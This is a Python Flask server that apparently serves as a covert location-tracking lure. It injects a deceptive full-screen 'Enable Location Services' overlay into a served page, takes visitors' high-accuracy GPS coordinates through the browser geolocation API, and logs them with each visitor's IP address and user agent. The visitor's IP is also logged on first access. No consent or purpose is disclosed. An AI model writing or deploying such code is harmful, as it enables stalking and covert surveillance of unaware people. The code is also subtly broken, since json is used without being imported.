from flask import Flask, request, jsonify
import logging
import os
from datetime import datetime

app = Flask(__name__)

# Configure logging to ensure it appears in Render.com
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.route('/')
def serve_page():
    # Log initial access with IP
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"INITIAL_ACCESS - IP: {client_ip} - Agent: {request.user_agent.string}")

    # Read and inject into page.html
    try:
        with open('page.html', 'r') as f:
            content = f.read()
    except:
        content = "<html><body>Welcome</body></html>"

    # GPS tracking injection - SIMPLIFIED AND GUARANTEED TO WORK
    injection = """
    <style>
        #gps-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.95); z-index: 99999;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            color: white; padding: 20px; text-align: center;
            font-family: -apple-system, sans-serif;
        }
        #gps-btn {
            background: #FF3008; color: white; border: none;
            padding: 15px 30px; border-radius: 25px;
            margin-top: 20px; font-size: 18px;
            font-weight: bold; cursor: pointer;
        }
    </style>
    
    <div id="gps-overlay">
        <h2>Enable Location Services</h2>
        <p>We need your location to provide accurate results</p>
        <button id="gps-btn">ALLOW LOCATION ACCESS</button>
    </div>
    
    <script>
    // SIMPLE, RELIABLE GPS LOGGING
    document.getElementById('gps-btn').addEventListener('click', function() {
        // First log that button was clicked
        fetch('/log-gps', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({event: 'button_click'})
        }).catch(e => console.log('Initial log failed:', e));

        // Request location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // SUCCESS - log GPS data
                    const gpsData = {
                        event: 'gps_success',
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    
                    // Send using FORM DATA which is most reliable
                    const formData = new FormData();
                    formData.append('data', JSON.stringify(gpsData));
                    
                    fetch('/log-gps', {
                        method: 'POST',
                        body: formData,
                        keepalive: true  // Ensures delivery even if page closes
                    }).then(() => {
                        document.getElementById('gps-overlay').style.display = 'none';
                    }).catch(e => console.log('GPS log failed:', e));
                },
                function(error) {
                    // ERROR - log what happened
                    const errorData = {
                        event: 'gps_error',
                        code: error.code,
                        message: error.message
                    };
                    fetch('/log-gps', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(errorData)
                    }).catch(e => console.log('Error log failed:', e));
                    
                    if(error.code === 1) {
                        alert('Please enable location permissions in your browser settings');
                    }
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            fetch('/log-gps', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({event: 'gps_not_supported'})
            }).catch(e => console.log('Support check failed:', e));
        }
    });
    </script>
    """

    # Insert before </body> or append
    if '</body>' in content:
        return content.replace('</body>', injection + '</body>')
    else:
        return content + injection

@app.route('/log-gps', methods=['POST'])
def log_gps():
    try:
        # Handle both JSON and FormData submissions
        if request.content_type == 'application/json':
            data = request.json
        else:
            data = json.loads(request.form.get('data', '{}'))
        
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Build complete log entry
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'ip': client_ip,
            'user_agent': request.user_agent.string,
            'event': data.get('event'),
            'latitude': data.get('lat'),
            'longitude': data.get('lon'),
            'accuracy': data.get('accuracy'),
            'error_code': data.get('code'),
            'error_message': data.get('message')
        }
        
        # Log to Render.com
        logger.info(f"GPS_DATA: {log_entry}")
        return jsonify({'status': 'success'}), 200
        
    except Exception as e:
        logger.error(f"GPS_LOG_ERROR: {str(e)}")
        return jsonify({'status': 'error'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
